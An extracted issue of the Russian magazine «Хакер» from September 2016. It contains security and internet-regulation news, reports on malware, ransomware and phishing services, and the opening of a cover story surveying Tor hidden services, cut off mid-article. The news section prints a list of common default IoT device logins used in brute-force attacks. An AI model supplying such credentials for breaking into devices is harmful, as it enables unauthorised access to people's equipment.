                                                            СЕНТЯБРЬ 2016


              №212


                                 Cover Story
  СЕКРЕТЫ
  ДАРКНЕТА
               Что полезного есть в TOR в 2016-м?





Выбираем                                         Извлекаем
бюджетный                Отучаем                   данные
Wi-Fi-адаптер               от жадности          из iOS-устройств
для аудита                 Android-аппы         и анализируем их
                                           сентябрь 2016
          № 212





  MEGANEWS
Всё новое за последний месяц

  Что дают в дарквебе
Ищем полезное в скрытых сервисах Tor

  Leakreporter
Как мониторят даркнет

  Адаптеры к бою!
Выбираем хакерский девайс для аудита Wi-Fi

  По стопам Сноудена
Обходим ограничения прав на рабочем компьютере

  Те самые дроиды
28 полезных ботов для Telegram

 WWW2
Интересные веб-сервисы

  Карманный софт
Выпуск #23. Софт с xda-developers.com

  Дайджест новостей за месяц
«Убийца Android» от Google, Android 7.0, CyanogenMod ZNH5Y

  Играем в панели уведомлений, вводим PIN-код взмахами
Колонка Евгения Зобнина

  Десятка лучших
Большой обзор Android-прошивок для самых привередливых

  Укрепляем крепость
Как сделать iOS еще безопаснее и защитить смартфон после джейлбрейка

  Опасный Китай
Говорим о защищенности китайских смартфонов и взламываем их

  EASY HACK
Прикручиваем умный процессинг HTTP-ответов в Burp Intruder

  Обзор эксплоитов
Анализ новых уязвимостей

  Ломаем софт для Android
Часть 1. Когда платное становится бесплатным

  Мобильная криминалистика
Извлекаем данные из iOS-устройств и проводим их анализ

  X-TOOLS
Софт для взлома и анализа безопасности

  Летняя малварь — 2016: свежая, горячая, твоя
Обзор самых интересных вредоносов за последние три месяца

  Новые угрозы для старых PoS-терминалов
Колонка Дениса Макрушина

  Заводной скриптинг для Android
Знакомимся с крутой системой автоматической сборки Gradle

  В поисках скрытых API
О том, какие функции Android прячет от глаз разработчиков

  Тест Markdown-редакторов для Android
Есть ли у планшетоводов возможность комфортно генерить контент в MD-формате?

  data.table — таблицы на стероидах
Выжимаем максимум скорости при работе с табличными данными в языке R

  Скриптуем всё!
Полезные shell-скрипты на все случаи жизни

  Сам себе админ
Учимся настраивать VDS и переносить сайты

  Жонглируем контейнерами
Разбираемся с системой управления контейнерами Kubernetes

  Быстрый старт с Virtuozzo
Знакомимся с крутой системой контейнерной виртуализации

  FAQ
Вопросы и ответы

  Титры
Кто делает этот журнал
                                        Мария «Mifrill» Нефедова
                                                     nefedova.maria@gameland.ru





РУНЕТ ПОД
КОНТРОЛЕМ
В начале сентября Сбербанк и Министерство внутренних дел разработали со-
вместный законопроект, который требует признать киберпреступления кража-
ми, а не квалифицировать их как мошенничество.
  О готовящемся  законопроекте журналистам  рассказал  замначальни-
ка главного управления безопасности и защиты информации Банка России
Артём Сычёв. По его мнению, документ «является одной из важнейших зако-
нодательных инициатив на данный момент»: сейчас максимальный срок за ки-
бермошенничество в России плохо соотносится с мировой практикой. Так,
в США наказание по такому виду преступлений составляет двадцать пять лет,
а в Китае — от десяти лет лишения свободы. Журналисты поинтересовались
у представителей ИТ-индустрии, каково их мнение о данном законопроекте,
и получили вполне положительные ответы. Правда, эксперты уточнили, что до-
казывать вину хакеров не всегда легко и нужно подходить к этому вопросу очень
внимательно.
   Середина сентября ознаменовалась курьезным событием: два крупней-
ших порносайта в мире, Pornhub и Youporn, были полностью заблокированы
на территории России решениями районных судов. Подавший иск о блокиров-
ке Pornhub прокурор Бутурлиновского районного суда Воронежской области
апеллировал к тому, что «предусмотрен запрет на распространение информа-
ции об обороте порнографических материалов или предметов на указанном
сайте». Первореченский районный суд города Владиовостока решил заблоки-
ровать YouPorn с еще более обтекаемой формулировкой: «выявлен факт раз-
мещения информации порнографического характера». При этом на террито-
рии РФ потреблять (то есть «просматривать») порнографию не запрещено.
   Денис Грибанов (прокурор Бутурлиновского района, заблокировавший
Pornhub) уточнил, что такой вид надзора стал использоваться в районной про-
куратуре недавно, но Pornhub — далеко не единственный ресурс, привлек-
ший внимание властей. «Мы не являемся слишком активными потребителями
данных интернет-ресурсов и не знаем о популярности тех или иных сайтов...
Длянасвсесайты,наносящиевреддуховному,нравственномуразвитиюнесо-
вершеннолетних,равны», — заявил Грибанов.





Представители Pornhub, перебросившись с представителями Роскомнадзора
парой шуток в твиттере, оперативно предложили российским пользователям
альтернативу в виде зеркала pornhub.ru. Однако через несколько дней было
заблокировано и зеркало. Ранее пресс-секретарь Роскомнадзора Вадим Ам-
пелонский предупреждал, что в реестр запрещенных сайтов могут быть внесе-
ны дополнительные ссылки: очевидно, именно о таких «дополнительных ссыл-
ках» и шла речь.
  ФСБ, Минкомсвязь и Минпромторг продолжили обсуждение возможности
дешифрования интернет-трафика россиян, как того требует «закон Яровой».
Журналисты «Коммерсанта» ссылаются на информацию, полученную от топ-ме-
неджера одного из производителей оборудования, члена Администрации пре-
зидента, а также неназванного источника в IT-компании. «В интернете огром-
ноеколичествосайтов,которыенеявляютсяорганизаторамираспространения
информацииииспользуютзащищенноеHTTPS-соединение, — поясняют собе-
седники издания. — Безрасшифровкитрафиканевсегдаможнопонять,нака-
кой сайт заходил пользователь, не говоря о том, что он там делал». Как один
из вариантов дешифровки трафика обсуждается установка в сетях операторов
оборудования, которое будет фактически выполнять MITM-атаки.
   Впрочем, эксперты скептически относятся как к схеме с применением MITM,
так и к самой идее тотальной расшифровки трафика. «Из всего ПО, обеспе-
чивающего работу с шифрованным трафиком, сертификат подобного удосто-
веряющего центра будет вырезан в ближайшем обновлении», — считает гла-
ва АРСИЭНТЕК Денис Нештун. «MITM работает для технологий на базе SSL.
НодляTLSтаксделатьсегоднянельзя,авслучаесend-to-endшифрованием,
на котором построено большинство мессенджеров, MITM вообще нереализу-
ем», — объясняет консультант по интернет-безопасности Cisco Алексей Лу-
кацкий. Кроме того, эксперты считают, что иностранные компании требовани-
ям «пакета Яровой» просто не подчинятся.
   Пользователи Рунета тем временем саркастически шутят, что результатом
такого «государственного воздействия» станет ситуация, аналогичная севе-
рокорейской: как внезапно выяснилось 19 сентября из-за ошибки в корневом
DNS-сервере Северной Кореи, в доменной зоне .kp размещено всего 28 сай-
тов. Большинство этих сайтов вполне предсказуемо принадлежат правитель-
ству КНДР, но есть несколько сайтов компаний (к примеру, авиакомпании Air
Koryo), сайт friend.com.kp (своего рода клон Facebook), портал portal.net.kp
(клон Yahoo) и ресурс korfilm.com.kp, который странным образом напоминает
пиратский ресурс Movie4k.


КРУПНЫЕ УТЕЧКИ ДАННЫХ КОСНУЛИСЬ 97%
КОМПАНИЙ ИЗ СПИСКА FORBES

   Исследователи компании Digital Shadows проанализировали список Forbes, в который вхо-
дят топ-1000 компаний со всего мира. Как оказалось, крупные утечки данных, которых в 2016
году было немало, так или иначе затронули почти всех участников данного топа.

Эксперты обнаружили, что 5 550 485 учетных данных, фигурирующих в различных дампах,
связаны с корпоративными email-адресами из списка Forbes
Наиболее значительный удар по бизнес-сегменту нанесли утечки данных LinkedIn, Adobe
и MySpace





Больше других от утечек данных пострадал технологический сектор: хакеры похитили более
2,5 миллиона корпоративных учетных данных. Также пострадали индустрия развлечений,
финансовый сектор и нефтегазовая промышленность





СОФТ МЕСЯЦА
Начало сентября ознаменовалось и интересными софтверными «открытия-
ми». Так, спустя семь лет после выпуска последнего релиза в начале сентя-
бря внезапно обновился знаменитый инструмент для аудита и взлома паролей
L0phtCrack. Разработчики объясняют, что они реконструировали инструмент
полностью и едва ли не переписали с нуля: новая версия работает в несколько
раз быстрее, дружит со всеми ОС семейства Windows, а также поддержива-
ет новые типы парольных хешей UNIX и может работать с другими импортера-
ми и инструментами для взлома через функции плагина. Впрочем, бесплатно
всеми этими функциями можно пользоваться только первые пятнадцать дней,
после чего потребуется заплатить от 595 долларов за полную версию прило-
жения.
   1 сентября был опубликован альтернативный неофициальный опенсорсный
клиент для Skype, о чем сообщил его разработчик Ефим Бушманов. Бушманов
занимался обратным инжинирингом протокола Skype и его механизмов шиф-
рования данных более пяти лет. В 2014 году его блог, в котором были опубли-
кованы ссылки на исходные коды, уже закрывали из-за нарушения DMCA, одна-
ко, судя по результатам, это не остановило исследователя.
   Бушманов пишет, что его опенсорсный клиент написан на C, оснащен не-
сложным GUI на базе DotNet 4.0 и готов к загрузке в Visual Studio 2010. Клиент
пригоден только для обмена текстовыми сообщениями, но в будущем иссле-
дователь надеется расширить его функциональность. Исходные коды опубли-
кованы на GitHub и продублированы на других хостинговых сервисах.
  И наконец, независимый исследователь, известный под псевдонимом Rui,
в начале месяца привлек внимание общественности к трояну Revenge-RAT v.0.1,
который практически не обнаруживался антивирусными системами. Любопыт-
но, что троян при этом являлся альфа-версией и распространялся в Сети со-
вершенно бесплатно, а его автор не озаботился даже базовой защитой и об-
фускацией кода. В этом свете не совсем ясно, почему антивирусные сканеры
не обнаруживали угрозу.





Результаты своих изысканий исследователь передал операторам VirusTotal,
и теперь рейтинг обнаружения Revenge увеличился с 1/57 до 41/57. Rui пишет,
что, поскольку некоторые известные антивирусы по-прежнему «не видят» тро-
яна, «это просто демонстрирует, насколько ущербна вся антивирусная инду-
стриявцелом».
  В середине сентября открытием для пользователей Adblock Plus стала
новость о запуске разработчиком Adblock платформы по продаже рекламы.
В принципе, разработчики никогда и не скрывали, что собираются искоренять
только раздражающую и навязчивую рекламу, а не вообще всю рекламу в ин-
тернете. Более того, платформа по продаже «приемлемой рекламы» в Adblock
Plus работает с 2011 года. Но до этого месяца, если верить заявлениям раз-
работчиков, процесс согласования занимал недели, а теперь будет занимать
лишь пару секунд. Во сколько раз теперь увеличится поток «разрешенной» ре-
кламы и какое количество пользователей Adblock Plus после этого вспомнят
о существовании других блокираторов, мы скоро узнаем.
  В конце месяца в свободном доступе оказались исходные коды бота Sp@m
Looper, разработанного исследователем Брайаном Вайнрайхом для избав-
ления от спама. В отличие от интеллектуальных фильтров, которые нацелены
на выявление и удаление спама, бот Вайнрайха предназначен наказать самих
спамеров: он пытается отнять у спамеров время, вступая с ними в бесконечную
переписку. «Яподумал,чтоеслиябудуотниматьунихвремя,тоимбудетнеког-
дасовершенствоватьновыеспамерскиетехники», — поясняет разработчик.
   Как ни странно, бот работает отлично: в среднем спамеры обмениваются
с ботом минимум четырьмя-пятью сообщениями, а некоторые ведут перегово-
ры со Sp@m Looper неделями. Также бот может приносить весьма неожидан-
ную пользу: например, однажды он сумел выторговать у спамера скидку в раз-
мере 50 долларов. Однако спустя пять месяцев исследователь все же устал
развивать этот проект и опубликовал исходные коды на GitHub. Теперь любой
желающий может использовать его метод, чтобы потроллить спамеров.

        123456
                             по-прежнему остается80%   DNSSEC-серверов           одним из самых
    сконфигурированы          популярных паролей
        неверно                                         В последнее время малварь все
    В начале 2016 года специалисты             чаще атакует IoT-устройства, ведь,
   Akamai сообщили, что число DDoS-а-              как показала практика, из них полу-
   так, в ходе которых DNS используется            чаются отличные ботнеты. По данным
   для усиления мощности, растет. После            Symantec, вредоносы все больше
   этого специалисты компании Neustar             ориентируются сразу на несколько
   провели собственное исследование,             платформ, к примеру на x86, ARM,
   проанализировав 1349 доменов, ис-            MIPS и MIPSEL, стараясь охватить все
  пользующих DNSSEC. Оказалось, что            разнообразие IoT-девайсов. Также
   из-за неправильной настройки четыре            встречаются образцы для архитектур
   из пяти DNSSEC-серверов (1084 до-             PowerPC, SuperH и SPARC. При этом
   мена) могут использоваться для усиле-           зачастую IoT-устройства уязвимы
   ния и отражения DDoS-атак. При этом           лишь из-за того, что пользователи
  DNSSEC позволяет усилить мощность            не меняют логин и пароль, присво-
   атаки в 28,9–217,2 раза. Так, если из-           енные гаджетам по умолчанию, что
   начальный запрос атакующих к серверу           значительно облегчает брутфорс
   «весит» порядка 80 байт, то сервер              атакующим. Аналитики компании
  DNSSEC ответит как минимум 2313              представили антитоп учетных данных
   байтами (размер базового ANY-отве-             для IoT-устройств. Первая пятерка
   та). Специалисты пишут, что в некото-            выглядит так: root:admin, admin:root,
  рых случаях ответ сервера может до-           DUP root:123456, ubnt:12345 и
   стигать 17 377 байт в объеме.                     access:ubnt.





                  «Нужно отдавать себе отчет, что тот ме-
                    ханизм, который обсуждается и предла-
                      гается, на сегодняшний день является
                   незаконным. Это чистой воды хакерская
                      атака. Перехват частных сообщений
                  и частной информации — это сродни
                     захвату частной собственности. Третьи
                  лица получают контроль над всеми тран-
                   закциями, которые вы осуществляете.
                  Другими словами, управление вашим
                  банковским счетом, вашим имуществом
                 может осуществлять третье лицо. Для
                 меня не совсем понятно, как это можно
                   делать в рамках соблюдения конституци-
                  онных прав граждан».

                                                                   Интернет-омбудсмен Дмитрий Мариничев
                                               о намерении ФСБ дешифровать весь интернет-трафик в России

«ЖЕЛЕЗНЫЕ»
НОВОСТИ
«Выглядит как Mac. Ощущает-
ся как Mac», — гласит реклама
на официальном сайте проек-
та  HacBook.  Этот небольшой
стартап  предлагает оформить
предварительный заказ на го-
товый хакинтош «из коробки»:
немного  измененный  ноутбук
HP  EliteBooks обойдется  все-
го в 329 долларов и идеально
подойдет для работы с macOS.
Как ни странно, авторы данно-
го проекта считают, что компа-
ния Apple не сможет их засудить,
как это уже случилось с компани-
ей Psystar Corporation (тоже ком-
мерчески распространявшей ха-
кинтоши).
   Характеристики   HackBook
довольно   средние:   постро-
енный на базе HP EliteBooks ноутбук обладает 14-дюймовым экраном (1600
х 900 пикселей), процессором Sandy Bridge i5, 8 Гбайт оперативной памяти,
жестким диском объемом до 1 Тбайт и поддерживает беспроводные стандар-
ты 802.11a/b/g/n. Устройство поставляется без предустановленной ОС: ав-
торы проекта подразумевают, что пользователи сами приобретут лицензион-
ную macOS у Apple. Впрочем, за такую сумму сложно было бы ожидать чего-то
большего.
  Еще одна интересная новость связана с устройством, которое наверняка
запомнилось многим нашим читателям, — USB Killer 2.0, мы о нем рассказыва-
ли в 2015 году. Его создатель Dark_Purple даже начал собственную кампанию
по сбору средств на выпуск USB Killer 2.0, но запустить гаджет в производство
так и не удалось. А недавно обнаружилось, что некая гонконгская компания вы-
шла на рынок с проектом USB Kill, в рамках которого продает устройство USB
Killer и девайс Test Shield (его можно использовать вместе с «флешкой-убий-
цей», чтобы предохранить принимающую сторону от повреждений). Оба гадже-
та доступны для заказа, доставляются по всему миру. USB Killer можно приоб-
рести за 50 евро, а Test Shield обойдется в 14 евро.
   Представители USB Kill рассказали «Хакеру», что их устройство не имеет
прямого отношения к прототипу от Dark_Purple: оно было создано тремя кол-
легами и друзьями из Гонконга и Шэньчжэня, которые уже почти пять лет зани-
маются разработкой различного железа для пентестеров. Все эти годы компа-
ния работала преимущественно с клиентами из частного сектора и занималась
кастомными проектами, поэтому до USB Kill о них мало кто знал.
   Перечисляя «железные» новости, нельзя обойти вниманием и выход на ры-
нок новой версии смартфона Apple. Правда, новость состоит не столько в том,
что в сентябре в продажу поступил iPhone 7, сколько в том, что джейлбрейк
iPhone 7 был сделан всего за сутки: исследователь Люка Тодеско запостил
в свой твиттер фото, на котором iPhone работает под управлением iOS 10.0.1
и демонстрирует поддержку Cydia, что на устройстве без джейлбрейка невоз-
можно. Также исследователь предоставил журналистам дополнительное ви-
део, еще раз доказывающее, что джейлбрейк — не подделка. Детали джей-
лбрейка Тодеско решил пока держать при себе.


ЛЮДИ ПО-ПРЕЖНЕМУ КЛИКАЮТ
НА ВСЕ ССЫЛКИ ПОДРЯД

   В наши дни эксперты часто говорят о том, что пользователям нужно в буквальном смысле
преподавать азы компьютерной грамотности и информационной безопасности. Многие ком-
пании регулярно проводят ИБ-тренинги для своих сотрудников, понимая, что самым слабым
звеном в защите по-прежнему остается пресловутый человеческий фактор. Но исследователи
из немецкого университета Эрлангена — Нюрнберга доказывают, что сломать привычки поль-
зователей не так-то просто.
Исследователи разослали студентам 1700 фишинговых сообщений, используя для отправки
фейковые email-адреса и аккаунты Facebook

В сообщениях содержалась ссылка, якобы ведущая на фотографии с новогодней вечеринки,
которая в самом деле имела место неделей ранее

Если сообщение было персонифицированным (к пользователю обращались по имени), по
ссылке из писем прошли 56% испытуемых, а по ссылке из Facebook-сообщений перешли
37%
Обезличенные сообщения вызвали больше подозрений: лишь 20% студентов перешли по
ссылке из письма, а Facebook-сообщению поверили 42%
При этом 78% участников эксперимента позже признали, что осознавали риски, которые
несет переход по такой ссылке
Лишь 20% получателей персонифицированных сообщений и 16% получателей
обезличенных сообщений потом признались, что кликнули по ссылке





                               Продолжение статьи
  Начало статьи


  =





ТЩЕСЛАВНЫЕ
ХАКЕРЫ
В апреле текущего года специалисты команды IBM X-Force описывали в своем
блоге интересную ситуацию: автор популярного мобильного банкера GM Bot
оказался заблокирован на крупных торговых площадках даркнета, и за освобо-
дившееся место немедленно развернулась активная борьба. Среди претен-
дентов на роль нового лидера в этой области был и мобильный троян Bilal Bot,
который исследователи IBM X-Force описали не совсем верно. Об этом им не-
давно сообщил сам автор этой малвари.
   «Здравствуйте! Я разработчик и владелец малвари Bilal Bot. На вашем сай-
те опубликована неверная информация. Вы рассматривали бета-версию моего
Bilal Bot. С тех пор было много изменений и улучшений, так что ваш текст в целом
и перечисленные в нем цены в частности абсолютно устарели. Если хотите, я дам
вам интервью относительно моей малвари Bilal Bot, или я хотел бы попросить вас
изменить или обновить вашу публикацию», — написал автор.
   Исследователи IBM X-Force не могли оставить послание без внимания и из-
учили Bilal Bot повторно. Малварь действительно обновилась: среди новых
функций исследователи обнаружили перехват SMS-сообщений, перенаправ-
ление голосовых звонков и перекрытие экрана устройства. Остается гадать,
действительно ли публичное мнение независимых исследователей так сильно
влияет на заработки разработчиков зловредов, или же просто автор Bilal Bot
обладает повышенным чувством собственной важности?
   Если принять во внимание судьбу еще одного зловреда, можно предполо-
жить, что публичное мнение имеет вес. Речь идет о шифровальщике Shark, про
который мы писали еще в августе. Тогда эксперты изучили схему распростра-
нения и предположили, что она мошенническая: авторы Shark распространяли
трояна бесплатно по «партнерской программе», предлагая любому желающе-
му стать «оператором» и получать 80% от всех выкупов. Вот только все выкупы
от жертв зловреда идут на биткойн-кошелек создателей шифровальщика, так
что нет никаких гарантий, что те в итоге поделятся с «партнерами».





В итоге авторы Shark были вынуждены сменить имя своего проекта на Atom
и поменять домен в попытках избавиться от такого «пятна» на «репутации». Те-
перь сайт проекта Shark переадресует своих посетителей на другой домен, где
их вниманию предлагается «шифровальщик Atom». Под новым именем скрыва-
ется все тот же Shark, пользователям по-прежнему бесплатно предоставляется
готовая версия шифровальщика, а «партнерская программа» предлагает все
те же условия 80/20. Судя по всему, эксперты оказались правы, и информация
в СМИ действительно может влиять на планы мошенников.
   Стоит упомянуть и об интересном персонаже, обнаруженном специалиста-
ми компании Sophos в ходе мониторинга хакерских форумов. Исследователи
заметили пользователя под ником Pahan (с различными вариациями на разных
форумах), который бесплатно распространял образцы чужой малвари, зара-
женные кейлоггерами и троянами. Таким способом злоумышленник «охотил-
ся» на других хакеров (или тех, кто только собирался ими стать) и использовал
украденные учетные данные от аккаунтов на хакерских форумах для повышения
собственной репутации.

       73,7%77%   россиян пользуются           исследователей —
     устаревшим ПО                это самоучки

     Аналитики «Лаборатории Каспер-                Разработчики платформы
   ского» собрали интересную статистику            HackerOne, на базе которой работают
   с помощью облачной инфраструктуры            bug bounty программы сотен крупных
   Kaspersky Security Network. По данным            компаний, представили отчет за 2016
  KSN, 77% российских пользователей               год, где рассказали немного о самих
  работают с устаревшим ПО, в среднем             хакерах. Согласно данным компании,
   на одном ПК содержится семь прило-             за 2016 год исследователи подали
   жений, которым нужны обновления.             617 отчетов об уязвимостях, полу-
  Более 80% уязвимостей в первой поло-           чив деньги за свой труд. При этом
  вине 2016 года пришлось на веб-бра-          90% хакеров моложе 34 лет и 97% из
  узеры и Microsoft Office, их «забыва-              них — это мужчины. Также известно,
   ют» обновить чаще всего. Также у 3/4              что большинство (17%) исследова-
   пользователей имеется ряд программ,            телей занимают поиском багов на
  о существовании которых они не по-             протяжении трех лет, а 73,7% и вовсе
   дозревают. Как правило, это модули              являются самоучками. Интересно и
  и приложения, которые устанавлива-                то, что 57% багов были добавлены в
  ются автоматически при скачивании             программы, которые вообще не вы-
   различного бесплатного ПО. Подобная           плачивают финансовых вознагражде-
   bloatware есть у каждого четвертого               ний. Хакеры утверждают, что ломают,
   пользователя, в среднем по две про-             «чтобы заработать» (71,5%), «для
  граммы на человека.                            развлечения» (70,5%), а также «чтобы
                                                  сделать мир лучше» (50,8%).





                    «Отсутствие разъема 3,5 мм будет раз-
                   дражать многих людей. Лично я не стал
                бы пользоваться Bluetooth, так как не
                люблю беспроводной звук. У меня есть
                 машины, в которых можно подключить
                   источник напрямую или через Bluetooth,
                  и в случае Bluetooth музыка звучит очень
                    плоско. Вообще, я считаю, что будущее
                   за разъемом USB-C. Один из моих люби-
                 мых Android-смартфонов — это Nexus 5X,
                  и он использует именно такой разъем».

                                                                               Стив Возняк
                                                            о новых iPhone 7 и отсутствии разъема 3,5 мм





ВЗЛОМ КАК СЕРВИС
В наше время уже никого не удивить тем, что хакеры предлагают свою мал-
варь как услугу (RaaS, ransomware-as-a-service), как тот же Shark, описанный
выше. Однако экспертам компании Fortinet удалось обнаружить кое-что более
интересное: русскоязычный сайт, который работает по модели Phishing-as-
a-Service, предлагая в качестве услуги фишинг. Ресурс под названием Fake-
Game за скромную плату предоставляет всем желающим возможность создать
поддельные копии страниц социальных сетей, почтовых сервисов, игровых
платформ и так далее. Прямо на главной странице сообщают, что «на данный
момент суммарно угнано 753 916 аккаунтов», и приглашают «быстро и бес-
платно получить желаемые аккаунты: ВКонтакте, Одноклассники, Танки Онлайн,
Wargaming, STEAM, Warface и другие».





Самое интересное заключается в том, что фишинговые услуги предоставля-
ются бесплатно: все, что должен сделать атакующий, — отправить фальшивую
ссылку своей жертве. Операторы Fake-Game монетизируют свой бизнес, про-
двигая платные VIP-аккаунты, которые имеют расширенную функциональность
по сравнению с базовыми: за 230 рублей в месяц (больше — дешевле) поль-
зователям предлагается доступ к редактированию поддельных ссылок, доступ
ко всем пользовательским аккаунтам, кроме VIP, подробная статистика, чат
технической поддержки и так далее. Исследователи пишут, что Fake-Game на-
считывает уже 61 269 подписчиков и привлекает пользователей партнерскими
программами и скидками.
   Другая необычная вариация RaaS, обнаруженная в сентябре, — киберсеть
RAUM, которая специализируется на заражении и распространении заражен-
ных torrent-файлов. При помощи сервиса RAUM участники сети (попасть туда
можно лишь по специальному приглашению) добавляют пейлоады малвари
в популярные торрент-файлы и автоматизируют их распространение. Сеть ра-
ботает по модели Pay-Per-Install: клиенты RAUM получают деньги каждый раз,
когда малварь, которую они распространяют с помощью вредоносных торрен-
тов, доходит до «конечного адресата» и поражает очередную жертву.
   Процесс распространения малвари автоматизирован: взломанные аккаун-
ты извлекаются из логов ботнетов или приобретаются у «коллег», а инфраструк-
тура для распространения состоит из выделенных и виртуальных серверов,
скомпрометированных девайсов и частично располагается в Tor. Специали-
сты InfoArmor пишут, что через RAUM распространяется троян Dridex, спайварь
Pony, вымогатели Cerber, CryptXXX и CTB-Locker. Ежемесячно из-за вредонос-
ных торрентов страдают не менее 12 миллионов пользователей.



WORDPRESS ПО-ПРЕЖНЕМУ ОСТАЕТСЯ
САМОЙ АТАКУЕМОЙ CMS

   Аналитики компании Sucuri подготовили статистический отчет о самых взламываемых
сайтах второго квартала 2016 года. Исследование показало, что среди различных популярных
CMS хакеры все так же предпочитают WordPress и атакуют платформу куда чаще остальных.

Во втором квартале 2016 года заражения распределились следующим образом:
WordPress (78%), Joomla! (14%), Magento (5%) и Drupal (2%)

Количество взломанных сайтов в сравнении с первым кварталом 2016 года





При этом только 55% установок WordPress являются устаревшими. Другие CMS
показывают более плачевные результаты: Joomla! (86%), Drupal (84%)
и Magento (96%)





22% WordPress-сайтов взламывают, используя старые уязвимости в трех плагинах:
TimThumb, GravityForms и RevSlider

После взлома скомпрометированные ресурсы страдают от бэкдоров, распространяют малварь
и SEO-спам, становятся жертвами дефейсов и используются для фишинга





Только 18% изученных экспертами сайтов попадали в черные списки, то есть 82% остались
незамеченными

Наилучший результат по части обнаружения заражений показал Google, на него пришлось
52% добавленных в черные списки сайтов
COVERSTORY
ЧТО ДАЮТ
В ДАРКВЕБЕ
ИЩЕМ ПОЛЕЗНОЕ
В СКРЫТЫХ СЕРВИСАХ TOR





В распоряжении редакции «Хакера» ока-
залась база из более чем восьми тысяч
ссылок на сайты в даркнете. Это прак-
тически полный реестр работающих от-                                               WARNING
крытых ресурсов, доступных в Tor Hidden                                                                        Авторы и редакция
Services. Мы выбрали наиболее интерес-       не несут ответственно-                                                                              сти за то, что находится
                                                                       по ту сторону приведен-ные, чтобы рассказать о них читателям.
                                                                       ных ссылок. Взрослый
                                                                                   контент, нелегальные
                                                                         товары и услуги, раз-Форум кардеров, коллекция фотографий женщин, кото-                                                                       нообразные виды мо-
рые давят каблуками животных, зеркало русского форума                                                                         шенничества — все это
по Counter-Strike, женщины с листьями и шишками мари-     встречается в дарквебе
хуаны в интимных местах, чья-то файлопомойка с кучей     сплошь и рядом. Будь
                                                                           осторожен, не оставляй
книг и подшивкой старых выпусков «Хакера», форум лю-                                                                            нигде личные данные
бителей оружия, фотографии писающих женщин, архив       и помни о законах.
книг на китайском, форум для мужчин, увлеченных увели-
чением члена, и, конечно, наркотики во всех видах, фор-
мах и агрегатных состояниях. Все это можно увидеть мень-
ше чем за десять минут изучения темной стороны веба.
   Откопать что-то в этой куче мусора не так-то просто.
Мы в автоматическом режиме прошлись по всем ссылкам,
и из восьми тысяч страниц открылись лишь 4300. Порядка
тысячи сайтов с ходу требуют авторизации или показыва-        INFO
ют форму логина без каких-либо пояснений — тут на кри-
                                                                           Большинствовой козе не подъедешь. Немало набралось и пустых стра-                                                                             ссылок в этой
ниц, страниц с дефолтным ответом веб-сервера, а также       статье указывают
разнообразных зеркал, клонов и заглушек. В общем, даже     на скрытые сервисы
                                                                                             Tor. Самый простойесли учесть, что какие-то потенциально полезные сай-                                                                            способ открыть
ты доступны не 100% времени и просто не попали в нашу                                                                                их — установить
базу, в целом живых ресурсов набирается не так-то мно-          Tor Browser.
го — может, пара тысяч.

Используем Tor из Python

Запрашивать из своих скриптов страницы через Tor не намного сложнее, чем
из обычного интернета. Все, что для этого нужно, — локальная нода Tor (доста-
точно просто открыть Tor Browser), Python и библиотека SocksiPy. Вот скрипт,
который скачивает через Tor главную страницу The Pirate Bay и выводит ее со-
держимое. Ты наверняка разберешься, как скачать что-нибудь другое.





Что же это за ресурсы? После предварительной сортировки оказалось, что
набор тем крайне узок. Значительная часть сайтов — это магазины и торго-
вые площадки, выполненные в виде форумов или аукционов по образу eBay.
Наркотики, оружие, поддельные документы, краденые товары, кредитные кар-
ты, эксплоиты, ботнеты — все это можно во множестве найти на виртуальных
развалах. О конкретных примерах мы еще поговорим подробнее.
   К этой же категории можно отнести и сайты, где предлагают разные услуги
— от отмыва биткойнов до заказных убийств. И если первое звучит правдопо-
добно, то второе наверняка обман. Мошенничество, считай, прилегает к сег-
менту магазинов, делая его еще больше.
   Другой большой сегмент — это разного рода порнография. От изысков
вроде тех, что перечислены в начале статьи, до обычной разновидности, кото-
рой полно и в открытом интернете.
   Собственно, немалая доля ресурсов вызывает вопрос: ну и зачем было
прятать это в .onion? Либертарианские блоги, хакерские манифесты, домаш-
ние странички... Часто складывается впечатление, что кто-то просто хотел вы-
пендриться или поупражняться в размещении сайта модным способом. Такие
ресурсы пропадают один за другим — их владельцы быстро понимают, что
держать сервер накладно, а толку от него нет.

Поиск и каталоги

Первое, чем хочется себя обеспечить, оказавшись в альтернативной версии
интернета, — это поисковик. Тут вроде бы никаких проблем: существуют Torch,
Grams, not Evil, Fess, Candle, Ahima и, может, еще пара-тройка менее извест-
ных попыток повторить успех Google в дарквебе.
   Сравнивать поисковики, объективно оценивая качество выдачи, не возь-
мемся: для этого нужны хитрые метрики и методики, которыми мы не распо-
лагаем. По чисто субъективным ощущениям, у Grams серьезно заспамленные
результаты, а not Evil и Torch слабо сортируют выдачу: наверху вместо больших
сайтов может оказаться совершенно случайная фигня. Это не всегда недоста-
ток (фигня тоже может быть интересной), но наиболее приятным нам в итоге
показался Fess.





                                                                           Fess

Вот только в случае с дарквебом поиск а-ля Google — это далеко не такое же
классное и универсальное решение, как в обычном интернете. Во-первых, са-
мое интересное спрятано на форумах, которые зачастую требуют авториза-
ции, и поисковики оказываются в пролете. Во-вторых, ресурсов в целом так
мало, что поиск теряет всякий смысл: по разным запросам ты будешь встре-
чать одни и те же сайты плюс разнообразный мусор, не имеющий отношения
к делу. Ну и это уже не говоря о том, что в дарквебе у поисковиков мало шан-
сов отслеживать поведение пользователей через аналоги Google Analytics
и AdWords, чтобы улучшать качество результатов.





           Поддельный Google похож на настоящий, но радости от него заметно меньше

Решение проблемы в обычном интернете было найдено еще до появления со-
временных поисковиков и выглядит как каталог полезных ссылок. В каком-то
смысле эта статья — как раз такой каталог, просто мы отобрали наиболее ин-
тересные живые на данный момент ресурсы, а также, конечно, не зарабатыва-
ем на размещении ссылок.
  С популярными каталогами в дарквебе ситуация иная: на широко извест-
ной Hidden Wiki значительная часть ссылок не открывается вовсе, а расста-
новка приоритетов и принцип отбора вызывает серьезные вопросы к владель-
цам ресурса. Еще есть Onion URL Repository, OnionDir, Yet another Tor Directory,
TorLinks, HD Wiki, русская «Годнотаба» (кстати, действительно довольно год-
ная, хоть и небольшая) и еще сотни подборок — больших и маленьких, кури-
руемых и не очень, размещенных как в дарквебе, так и в обычном, светлом ин-
тернете.





                        «Годнотаба». Сверху висит объявление о том, что прием ссылок
                      приостановлен из-за деятельности злонамеренного школьника





   Yet another Tor Directory. Владельцы как бы подчеркивают, что анархия— мать порядка


Почта

Полностью анонимизированный почтовый ящик — штука полезная, и, конечно
же, такие сервисы существуют. Но сам понимаешь, спрос здесь очень спец-
ифический: слать письма и не оставлять следов хотят не только хакеры, шпи-
оны, политические диссиденты и информаторы, но и спамеры, вымогатели,
